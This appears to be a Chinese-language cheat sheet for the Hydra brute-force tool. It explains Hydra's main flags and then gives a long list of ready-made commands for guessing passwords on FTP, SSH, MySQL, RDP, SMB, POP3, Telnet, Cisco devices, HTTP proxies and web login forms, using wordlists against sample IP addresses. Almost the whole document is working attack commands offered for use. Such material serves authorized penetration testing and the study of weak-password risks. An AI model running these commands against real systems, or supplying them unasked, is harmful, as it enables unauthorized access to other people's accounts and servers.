# title{hydra - 一个自动化的爆破工具，暴力破解弱密码，是一个支持众多协议的爆破工具}

支持的协议 POP3，SMB，RDP，SSH，FTP，POP3，Telnet，MYSQL.

### 常用的参数
```bash
-l	指定单个用户名，适合在知道用户名爆破用户名密码时使用
-L	指定多个用户名，参数值为存储用户名的文件的路径(建议为绝对路径)
-p	指定单个密码，适合在知道密码爆破用户名时使用
-P	指定多个密码，参数值为存贮密码的文件(通常称为字典)的路径(建议为绝对路径)
-C	当用户名和密码存储到一个文件时使用此参数。注意，文件(字典)存储的格式必须为 "用户名:密码" 的格式。
-M	指定多个攻击目标，此参数为存储攻击目标的文件的路径(建议为绝对路径)。注意：列表文件存储格式必须为 "地址:端口"
-t	指定爆破时的任务数量(可以理解为线程数)，默认为16
-s	指定端口，适用于攻击目标端口非默认的情况。例如：http服务使用非80端口
-S	指定爆破时使用 SSL 链接
-R	继续从上一次爆破进度上继续爆破
-v/-V	显示爆破的详细信息
-f	一但爆破成功一个就停止爆破
server	代表要攻击的目标(单个)，多个目标时请使用 -M 参数
 
service	攻击目标的服务类型(可以理解为爆破时使用的协议)，
#例如 http ，在hydra中，不同协议会使用不同的模块来爆破，hydra 的 http-get 和 http-post 模块就用来爆破基于 get 和 post 请求的页面
OPT	爆破模块的额外参数，可以使用 -U 参数来查看模块支持那些参数，例如命令：hydra -U http-get
```




### 常用命令

```bash
## ftp密码破解
hydra -t 10 -V -f -l root -x 4:6:a ftp://192.168.67.132

## SSH暴力破解
hydra -L /data/dic/user.dic -P /data/dic/password.dic -t 5 192.168.2.235 ssh

## mysql暴力破解
hydra -L /data/dic/user.dic -P /data/dic/password.dic -t 5 192.168.2.235 mysql

## 远程桌面暴力破解
hydra -L /data/dic/user.dic -P /data/dic/password.dic -t 1 192.168.2.57 rdp

## 使用hydra破解ssh的密码
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh

## 破解https：
hydra -m /index.php -l username -P pass.txt IP https

##破解teamspeak：
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

## 破解cisco：
hydra -P pass.txt IP cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

## 破解smb：
hydra -l administrator -P pass.txt IP smb

## 破解pop3：
hydra -l muts -P pass.txt my.pop3.mail pop3

## 破解rdp：
hydra IP rdp -l administrator -P pass.txt -V

## 破解http-proxy：
hydra -l admin -P pass.txt http-proxy://10.36.16.18

## 破解telnet
hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

##破解ftp：
hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV

##get方式提交，破解web登录：
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php


hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql


hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:S=success"

hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:S=success"

hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:fail"
```

